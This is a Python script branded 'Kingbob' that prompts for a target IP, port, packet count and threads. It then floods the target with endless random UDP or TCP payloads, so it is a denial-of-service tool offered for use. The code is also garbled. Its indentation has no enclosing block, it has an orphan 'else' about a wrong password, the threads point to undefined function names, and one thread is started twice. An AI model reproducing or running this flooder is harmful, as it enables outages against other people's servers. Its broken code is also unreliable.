import random
import socket
import threading
import os, sys
import time
from termcolor import colored

print("\033[1;34;40m=>Build By Kingbob<=")
time.sleep(1)
print("\033[1;34;40m=>YT KINGBOB<=")
time.sleep(3)
os.system("clear")
print('''\033[1;36;40m
------------------------------------------------------------------                                                                  
@@@  @@@  @@@  @@@  @@@   @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   
@@@  @@@  @@@  @@@@ @@@  @@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  !@@  @@!  @@!@!@@@  !@@        @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!!  !@!  !@!!@!@!  !@!        !@   @!@  !@!  @!@  !@   @!@  
@!@@!@!   !!@  @!@ !!@!  !@! @!@!@  @!@!@!@   @!@  !@!  @!@!@!@   
!!@!!!    !!!  !@!  !!!  !!! !!@!!  !!!@!!!!  !@!  !!!  !!!@!!!!  
!!: :!!   !!:  !!:  !!!  :!!   !!:  !!:  !!!  !!:  !!!  !!:  !!!  
:!:  !:!  :!:  :!:  !:!  :!:   !::  :!:  !:!  :!:  !:!  :!:  !:!  
 ::  :::   ::   ::   ::   ::: ::::   :: ::::  ::::: ::   :: ::::  
 :   :::  :    ::    :    :: :: :   :: : ::    : :  :   :: : ::   
------------------------------------------------------------------                                                                      
                                                                      ''')
  
  choice = str(input(" Attack Methods (Udp/Tcp):<===> "))
  ip = str(input(" IP Target ;<===> "))
  port = int(input(" Port Target :<===> "))
  times = int(input(" Enter Packets :<===> "))
  threads = int(input(" Enter Threads :<===> "))
  def xxbr():
  	data = random._urandom(1050)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  			addr = (str(ip),int(port))
  			for x in range(times):
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  			print("\033[1;36;40m[â€¢]KINGBOB Attack This Ip %s Port %s"%(ip,port))
  		except:
  			print("\033[1;31;40mÃ— Warning!")
  
  def xxbr2():
  	data = random._urandom(102400)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  			s.connect((ip,port))
  			s.send(data)
  			for x in range(times):
  				s.send(data)
  			print("\033[1;36;40m[â€¢]KINGBOBAttack This Ip %s Port %s"%(ip,port))
  		except:
  			s.close()
  			print("\033[1;31;40mÃ— Warning!")
              
  for y in range(threads):
  	if choice == 'Udp':
  		th = threading.Thread(target = KINGBOBAttack)
  		th.start()
  	elif choice == 'Tcp':
  		th = threading.Thread(target = KINGBOBAttack2)
  		th.start()
  		th.start()
else:
  print("\033[1;31;40m[!] Wrong Password!")
